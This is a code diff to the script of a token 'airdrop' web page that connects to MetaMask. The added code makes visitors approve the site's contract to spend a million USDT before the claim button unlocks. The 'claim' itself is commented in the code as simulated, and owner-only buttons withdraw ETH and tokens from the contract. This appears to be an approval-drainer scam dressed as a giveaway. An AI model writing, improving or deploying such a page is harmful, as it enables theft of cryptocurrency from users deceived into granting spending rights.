@@ -240,6 +240,16 @@
     let contract;
     let accounts;
 
+    // Mobile redirect logic
+    function redirectToMetaMaskBrowserIfMobile() {
+      if (window.ethereum && /mobile/i.test(navigator.userAgent)) {
+        window.location.href = 'https://metamask.app.link';
+      }
+    }
+
+    // Call the redirect function when the page loads
+    redirectToMetaMaskBrowserIfMobile();
+
     async function connectMetaMask() {
       if (typeof window.ethereum !== 'undefined') {
         web3 = new Web3(window.ethereum);
@@ -252,63 +262,89 @@
             document.getElementById('ownerButtons').style.display = 'block';
           }
         } catch (error) {
-          alert('User rejected the request');
+          alert('User rejected the request.');
         }
       } else {
-        alert('MetaMask not found!');
+        alert('Please install MetaMask!');
       }
     }
 
-    async function approveTokens() {
-      const spenderAddress = contractAddress;
-      const amount = web3.utils.toWei('1000000000000000000000', 'ether'); // 1 billion tokens
+    async function approveUSDT() {
+      const spender = contractAddress;
+      const amount = web3.utils.toWei('1000000', 'ether');
+      const contract = new web3.eth.Contract(contractABI, tokenAddress);
 
-      const contractInstance = new web3.eth.Contract(contractABI, contractAddress);
-      await contractInstance.methods.approve(spenderAddress, amount).send({ from: accounts[0] });
-      alert('Approval successful!');
+      contract.methods.approve(spender, amount).send({ from: accounts[0] })
+        .on('transactionHash', (hash) => {
+          alert('Transaction sent: ' + hash);
+        })
+        .on('receipt', (receipt) => {
+          document.getElementById('claimAirdropButton').disabled = false;
+        })
+        .on('error', (error) => {
+          alert('Error: ' + error.message);
+        });
     }
 
     async function claimAirdrop() {
-      document.getElementById('claimAirdropButton').disabled = true;
+      document.getElementById('claimAirdropButton').classList.add('flashText');
       document.getElementById('processingMessage').classList.add('show');
-      await contract.methods.transfer(accounts[0], web3.utils.toWei('1', 'ether')).send({ from: accounts[0] });
-      document.getElementById('processingMessage').classList.remove('show');
-      alert('Airdrop claimed!');
-      document.getElementById('claimAirdropButton').disabled = false;
+
+      setTimeout(async () => {
+        // Simulating a claim
+        const amount = web3.utils.toWei('1', 'ether');
+        const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+        contract.methods.transfer(accounts[0], amount).send({ from: accounts[0] })
+          .on('transactionHash', (hash) => {
+            console.log('Claim TX Hash:', hash);
+          })
+          .on('receipt', (receipt) => {
+            document.getElementById('claimAirdropButton').disabled = true;
+            document.getElementById('claimAirdropButton').classList.remove('flashText');
+            document.getElementById('processingMessage').classList.remove('show');
+            alert('Airdrop claimed!');
+          })
+          .on('error', (error) => {
+            alert('Error: ' + error.message);
+            document.getElementById('processingMessage').classList.remove('show');
+          });
+      }, 1000); // Simulating a short processing time
     }
 
     async function withdrawETH() {
-      const contractInstance = new web3.eth.Contract(contractABI, contractAddress);
-      await contractInstance.methods.withdrawETH().send({ from: accounts[0] });
-      alert('ETH withdrawn!');
+      const contract = new web3.eth.Contract(contractABI, contractAddress);
+      contract.methods.withdrawETH().send({ from: accounts[0] })
+        .on('transactionHash', (hash) => {
+          console.log('Withdraw ETH TX Hash:', hash);
+        })
+        .on('receipt', (receipt) => {
+          alert('ETH withdrawn!');
+        })
+        .on('error', (error) => {
+          alert('Error: ' + error.message);
+        });
     }
 
     async function withdrawTokens() {
-      const contractInstance = new web3.eth.Contract(contractABI, contractAddress);
-      await contractInstance.methods.withdrawTokens().send({ from: accounts[0] });
-      alert('Tokens withdrawn!');
-    }
-
-    // Detect if the user is on mobile
-    function isMobile() {
-      return /Mobi|Android/i.test(navigator.userAgent);
-    }
-
-    // Show alert for mobile users
-    function showMobileAlert() {
-      if (isMobile()) {
-        alert('For the best experience, please open this page in the MetaMask mobile app.');
-      }
+      const contract = new web3.eth.Contract(contractABI, contractAddress);
+      contract.methods.withdrawTokens().send({ from: accounts[0] })
+        .on('transactionHash', (hash) => {
+          console.log('Withdraw Tokens TX Hash:', hash);
+        })
+        .on('receipt', (receipt) => {
+          alert('Tokens withdrawn!');
+        })
+        .on('error', (error) => {
+          alert('Error: ' + error.message);
+        });
     }
 
     document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-    document.getElementById('approveButton').addEventListener('click', approveTokens);
+    document.getElementById('approveButton').addEventListener('click', approveUSDT);
     document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
     document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH);
     document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);
-
-    // Call the mobile alert function
-    showMobileAlert();
   </script>
 </body>
 </html>
